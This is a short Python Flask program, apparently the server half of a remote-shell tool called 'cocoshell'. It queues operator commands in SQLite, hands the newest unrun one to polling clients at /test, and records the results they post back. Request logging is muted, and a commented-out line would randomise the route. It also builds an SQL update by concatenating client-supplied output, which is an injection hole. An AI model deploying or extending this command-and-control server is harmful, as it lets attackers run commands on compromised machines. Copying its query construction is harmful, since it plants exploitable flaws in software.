import random
import string
import logging
import sqlite3
from os.path import exists
from multiprocessing import Process
from flask import Flask, session, request
from werkzeug.exceptions import BadRequest

letters = string.ascii_lowercase
#route = '/' + ''.join(random.choice(letters) for i in range(3))

db_exists = exists("cocoshell.db")
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()

if not db_exists:
    # Either set up a new database ..
    cur.execute("CREATE TABLE commands (id integer primary key autoincrement, cmd text, result text, hasBeenRun integer)")
    cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES (null, null, 1)")
    con.commit()
else:
    # .. or make sure, that nothing from the last session is annoying
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()

#############################################################################

def is_command_available():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

def set_result(result):
    cur.execute("UPDATE commands SET result = '" + result + "' WHERE hasBeenRun = 0")
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()
    return True

#############################################################################

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
api = Flask(__name__)

@api.route('/test', methods=['GET', 'POST'])
def command_handling():
    if request.method == 'GET':
        last = is_command_available()
        if last[3] == 1:
            return ''
        else:
            return last[1]
    if request.method == 'POST':
        set_result(request.data.decode())
        return ''
        
if __name__ == '__main__':
    try:
        api.run()
    except KeyboardInterrupt:
        exit